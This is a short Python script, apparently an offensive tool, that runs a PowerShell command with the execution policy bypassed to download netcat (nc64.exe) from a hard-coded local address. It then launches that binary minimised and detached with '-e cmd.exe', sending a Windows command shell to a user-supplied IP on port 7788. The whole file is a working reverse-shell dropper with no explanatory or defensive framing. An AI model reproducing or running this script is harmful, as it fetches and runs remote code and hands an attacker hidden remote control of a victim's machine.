import os
from time import sleep 
ip = input("Enter ip address of remote system --> ")
port = 7788
url = "http://192.168.8.1/nc64.exe"  # Change url here
status = os.system(f"cd / &mkdir win &cd /win & echo (wget '{url}' -OutFile a.exe)>b.PS1 & powershell -ExecutionPolicy ByPass -File b.PS1")
if status:
    print("Download Error")
else:
    print("Downloaded")
sleep(0.5)
print("Starting .....")
status = os.system(f"START /MIN \\win\\a.exe {ip} {port} -e cmd.exe -d & exit")
if status:
    print("Start Error")
else:
    print("Started")
